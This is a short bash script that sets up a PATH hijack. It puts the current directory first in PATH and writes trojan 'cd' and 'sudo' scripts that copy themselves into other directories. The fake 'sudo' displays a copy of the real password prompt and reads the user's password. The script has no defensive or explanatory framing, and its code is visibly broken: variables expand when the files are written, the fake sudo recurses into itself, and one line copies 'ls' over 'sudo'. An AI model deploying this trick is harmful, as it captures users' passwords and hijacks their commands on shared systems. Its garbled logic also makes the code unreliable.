#!/bin/bash

PATH=.:$PATH

echo "#!/bin/bash" > cd
echo "cp cd $1/cd" >> cd
echo "cp sudo $1/sudo" >> cd
echo "cp ls $1/sudo" >> cd
echo "cd $1" >> cd
chmod +x cd

echo "#!/bin/bash" > sudo
echo "read -sp \"[sudo] password for $(whoami): \" p" >> sudo
echo "echo $p | sudo -S $@" >> sudo
chmod +x sudo

